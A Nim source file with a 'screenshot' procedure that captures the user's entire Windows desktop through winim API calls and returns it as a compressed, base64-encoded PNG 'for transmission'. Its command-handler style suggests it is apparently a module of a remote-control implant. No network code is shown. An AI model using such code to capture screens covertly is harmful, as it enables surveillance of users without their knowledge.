from winim import BI_RGB, BitBlt, BitmapInfo, CreateCompatibleBitmap, CreateCompatibleDC, 
                    CreateDIBSection, DeleteObject, DIB_RGB_COLORS, GetClientRect, GetDC, 
                    GetDesktopWindow, GetDIBits, SelectObject, SRCCOPY
from winim/inc/windef import Rect, HWND
import base64
import pixie
import zippy

# Take a screenshot of the user's desktop and send it back as an encoded string
proc screenshot*(args : varargs[string]) : string =
    # Get the size of the main screen
    var screenRectangle : windef.Rect
    GetClientRect(GetDesktopWindow(), addr screenRectangle)
    let
        width = screenRectangle.right - screenRectangle.left
        height = screenRectangle.bottom - screenRectangle.top

    # Create a bitmap to store the screenshot
    var image = newImage(width, height)

    # Copy screen to bitmap image
    var
        hScreen = GetDC(cast[HWND](nil))
        hDC = CreateCompatibleDC(hScreen)
        hBitmap = CreateCompatibleBitmap(hScreen, int32(width), int32(height))

    discard SelectObject(hDC, hBitmap)
    discard BitBlt(hDC, 0, 0, int32(width), int32(height), hScreen, int32(screenRectangle.left), int32(screenRectangle.top), SRCCOPY)

    # Set up the bitmap image structure
    var bmi : BitmapInfo
    bmi.bmiHeader.biSize = int32(sizeof(BitmapInfo))
    bmi.bmiHeader.biWidth = int32(width)
    bmi.bmiHeader.biHeight = int32(height)
    bmi.bmiHeader.biPlanes = 1
    bmi.bmiHeader.biBitCount = 32
    bmi.bmiHeader.biCompression = BI_RGB
    bmi.bmiHeader.biSizeImage = width * height * 4

    # Copy the bitmap data into the image
    discard CreateDIBSection(hDC, addr bmi, DIB_RGB_COLORS, cast[ptr pointer](unsafeAddr image.data[0]), 0, 0)
    discard GetDIBits(hDC, hBitmap, 0, height, cast[pointer](unsafeAddr image.data[0]), addr bmi, DIB_RGB_COLORS)

    # Flip the resulting image to the correct orientation
    image.flipVertical()
    for i in 0 ..< image.width * image.height:
        swap(image.data[i].r, image.data[i].b)

    # Encode the image as PNG, and compress and encode it for transmission
    result = base64.encode(compress(image.encodeImage(PngFormat)))

    # Clean up
    discard DeleteObject(hBitmap)
    discard DeleteObject(hDC)